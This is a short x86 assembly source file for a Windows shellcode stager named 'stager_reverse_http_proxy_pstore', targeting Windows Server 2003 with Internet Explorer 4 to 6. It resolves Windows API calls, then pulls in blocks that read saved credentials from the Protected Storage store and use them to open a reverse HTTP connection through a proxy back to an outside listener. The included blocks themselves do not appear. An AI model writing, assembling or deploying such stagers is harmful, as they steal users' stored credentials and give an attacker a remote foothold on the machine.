;-----------------------------------------------------------------------------;
; Author: Unknown
; Compatible: Windows Server 2003, IE Versions 4 to 6
; Build: >build.py stager_reverse_http_proxy_pstore
;-----------------------------------------------------------------------------;

[BITS 32]
[ORG 0]

  cld                    ; Clear the direction flag.
  call start             ; Call start, this pushes the address of 'api_call' onto the stack.
%include "./src/block/block_api.asm"
start:                   ;
  pop ebp                ; pop off the address of 'api_call' for calling later.
%include "./src/block/block_get_pstore_creds.asm"
%include "./src/block/block_reverse_http_use_proxy_creds.asm"
  ; By here we will have performed the reverse_tcp connection and EDI will be our socket.

